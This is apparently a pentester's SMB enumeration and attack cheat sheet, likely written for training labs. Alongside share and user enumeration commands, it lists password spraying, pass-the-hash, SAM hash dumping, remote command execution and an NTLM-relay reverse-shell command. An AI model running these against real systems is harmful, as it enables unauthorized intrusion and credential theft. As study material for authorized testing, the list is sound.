# SMB (139/445)
- [ ] Check Default Configuration
	```bash
	cat /etc/samba/smb.conf | grep -v "#\|\;"
	```
- [ ] Restart Samba
	```bash
	sudo systemctl restart smbd
	```
- [ ] Check for share
	```bash
	smbmap -H $IP
	```
	```bash
	crackmapexec smb $IP --shares -u '' -p ''
	```
	```bash
	smbclient -N -L //$IP
	```
	```bash
	smbclient -N -L \\\\$IP\\
	```
- [ ] Connect to SMB share
	```bash
	smbclient //$IP/SHARE_NAME
	```
	```bash
	smbclient \\\\$IP\\SHARE_NAME$
	```
	```bash
	smbclient -U user \\\\10.129.42.197\\SHARENAME
	```
	```bash
	smbclient //$IP/C$ -U site.com/username%Password
	```
	```bash
	smbclient //$IP/transfer -U username --pw-nt-hash 820d6348590813116884101357197052 -W site.com
	```
- [ ] Execute Commands
	```bash
	smb: \> !ls
	smb: \> !cat prep-prod.txt
	```
- [ ] Check Connections
	```bash
	smbstatus
	```
- [ ] SMB Nmap
	```bash
	sudo nmap $IP -sV -sC -p139,445
	```
- [ ] rpcclient
	```bash
	rpcclient -U "" $IP
	```
	| **rpcclient Query**   | **Description**   |
	| --------------|-------------------|
	| `srvinfo` | Server information |
	| `enumdomains` | Enumerate all domains that are deployed in the network |
	| `querydominfo` | Provides domain, server, and user information of deployed domains |
	| `netshareenumall` | Enumerates all available shares |
	| `netsharegetinfo <share>` | Provides information about a specific share |
	| `enumdomusers` | Enumerates all domain users |
	| `queryuser <RID>` | Provides information about a specific user |
- [ ] Brute Forcing User RIDs
	```bash
	for i in $(seq 500 1100);do rpcclient -N -U "" $IP -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
	```
- [ ] Impacket - Samrdump.py
	```bash
	samrdump.py $IP
	```
- [ ] [Enum4Linux-ng](https://github.com/cddmp/enum4linux-ng)
	```bash
	cd enum4linux-ng
	pip3 install -r requirements.txt
	./enum4linux-ng.py $IP -A
	```
	
|**Command**|**Description**|
|-|-|
| `smbclient -N -L //10.129.14.128` | Null-session testing against the SMB service. |
| `smbmap -H 10.129.14.128` | Network share enumeration using `smbmap`. |
| `smbmap -H 10.129.14.128 -r notes` | Recursive network share enumeration using `smbmap`. |
| `smbmap -H 10.129.14.128 --download "notes\note.txt"` | Download a specific file from the shared folder. |
| `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"` | Upload a specific file to the shared folder. |
| `rpcclient -U'%' 10.10.110.17` | Null-session with the `rpcclient`. |
| `./enum4linux-ng.py 10.10.11.45 -A -C` | Automated enumeratition of the SMB service using `enum4linux-ng`. |
| `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'` | Password spraying against different users from a list. |
| `impacket-psexec administrator:'Password123!'@10.10.110.17` | Connect to the SMB service using the `impacket-psexec`. |
| `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` | Execute a command over the SMB service using `crackmapexec`. |
| `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users` | Enumerating Logged-on users. |
| `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam` | Extract hashes from the SAM database. |
| `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE` | Use the Pass-The-Hash technique to authenticate on the target host. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146` | Dump the SAM database using `impacket-ntlmrelayx`. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`. |
